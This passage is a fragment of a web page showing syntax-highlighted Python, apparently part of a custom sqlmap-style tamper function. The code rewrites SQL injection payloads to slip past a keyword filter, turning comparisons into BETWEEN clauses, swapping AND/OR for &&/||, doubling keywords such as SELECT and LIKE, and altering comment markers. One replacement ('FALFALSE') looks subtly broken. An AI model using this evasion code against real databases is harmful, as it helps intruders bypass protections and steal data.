+        <span class="token keyword">if</span> retVal <span class="token operator">==</span> payload<span class="token punctuation">:</span>
+            match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*=\s*([\w()]+)\s*"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+            <span class="token keyword">if</span> match<span class="token punctuation">:</span>
+                _ <span class="token operator">=</span> <span class="token string">"%s %s BETWEEN %s AND %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _<span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"OR"</span><span class="token punctuation">,</span><span class="token string">"||"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token string">"&amp;&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"LIKE"</span><span class="token punctuation">,</span><span class="token string">"LILIKEKE"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"SELECT"</span><span class="token punctuation">,</span><span class="token string">"SELSELECTECT"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">,</span><span class="token string">"-=-"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"TRUE"</span><span class="token punctuation">,</span><span class="token string">"TRTRUEUE"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"FALSE"</span><span class="token punctuation">,</span><span class="token string">"FALFALSE"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"NOT"</span><span class="token punctuation">,</span><span class="token string">"NONOTT"</span><span class="token punctuation">)</span>
+</code></pre>
 
     </div>
   </div>
